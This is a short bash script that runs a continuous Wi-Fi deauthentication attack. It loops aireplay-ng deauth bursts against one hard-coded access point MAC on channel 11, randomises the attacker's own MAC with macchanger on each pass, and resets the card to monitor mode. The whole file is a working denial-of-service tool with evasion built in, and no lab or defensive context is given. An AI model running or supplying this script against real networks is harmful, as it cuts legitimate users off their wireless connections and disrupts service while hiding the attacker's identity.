#!/bin/bash
#Change MAC before running
#Also change channels when if error by "iwconfig wlan0 channel ['channel']

iwconfig wlan0 channel 11

while true
do
	aireplay-ng -0 5 -a C0:56:27:84:A6:B6 wlan0
	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC"
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan0 | grep Mode
	sleep 3s
	echo "ITERATION"
done
